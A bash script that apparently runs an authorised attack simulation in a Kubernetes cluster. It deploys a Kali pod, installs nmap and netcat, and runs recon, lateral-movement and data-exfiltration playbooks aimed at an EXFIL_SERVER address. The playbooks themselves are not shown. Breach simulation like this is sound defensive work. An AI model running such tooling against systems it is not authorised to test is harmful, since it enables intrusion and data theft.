#!/usr/bin/env bash
# Deploy a Kali-based attacker pod, run all simulation playbooks, then clean up.
set -euo pipefail

NS=${NAMESPACE:-securecloud}
KALI_IMAGE=${KALI_IMAGE:-kalilinux/kali-rolling}
EXFIL_SERVER=${EXFIL_SERVER:-10.0.0.99}

echo "==> Deploying attacker pod in namespace ${NS}"
kubectl run kali-attacker \
  --image="${KALI_IMAGE}" \
  --namespace="${NS}" \
  --restart=Never \
  --labels="app=kali-attacker,simulation=true" \
  --command -- sleep 3600

echo "==> Waiting for attacker pod to be Running"
kubectl wait pod/kali-attacker \
  --namespace="${NS}" \
  --for=condition=Ready \
  --timeout=120s

POD_NAME=kali-attacker
export PIVOT_POD="${POD_NAME}"
export EXFIL_SERVER="${EXFIL_SERVER}"

echo "==> Copying playbooks into pod"
kubectl cp attack-sim/playbooks "${NS}/${POD_NAME}:/tmp/playbooks"
kubectl cp attack-sim/scripts   "${NS}/${POD_NAME}:/tmp/scripts"

echo "==> Installing ansible inside pod (takes ~60s)"
kubectl exec -n "${NS}" "${POD_NAME}" -- \
  bash -c "apt-get update -qq && apt-get install -y -qq ansible nmap curl netcat-traditional dnsutils"

echo "==> Running recon playbook"
kubectl exec -n "${NS}" "${POD_NAME}" -- \
  ansible-playbook /tmp/playbooks/recon.yaml

echo "==> Running lateral-movement playbook"
kubectl exec -n "${NS}" "${POD_NAME}" -- \
  ansible-playbook /tmp/playbooks/lateral-movement.yaml

echo "==> Running data-exfiltration playbook"
kubectl exec -n "${NS}" "${POD_NAME}" -- \
  env EXFIL_SERVER="${EXFIL_SERVER}" \
  ansible-playbook /tmp/playbooks/data-exfiltration.yaml

echo "==> Collecting simulation results"
mkdir -p attack-sim/results
kubectl cp "${NS}/${POD_NAME}:/tmp/recon-results"  attack-sim/results/recon
kubectl cp "${NS}/${POD_NAME}:/tmp/lateral-results" attack-sim/results/lateral
kubectl cp "${NS}/${POD_NAME}:/tmp/exfil-results"  attack-sim/results/exfil

echo "==> Cleaning up attacker pod"
kubectl delete pod kali-attacker --namespace="${NS}" --ignore-not-found

echo "==> Simulation complete. Results in attack-sim/results/"
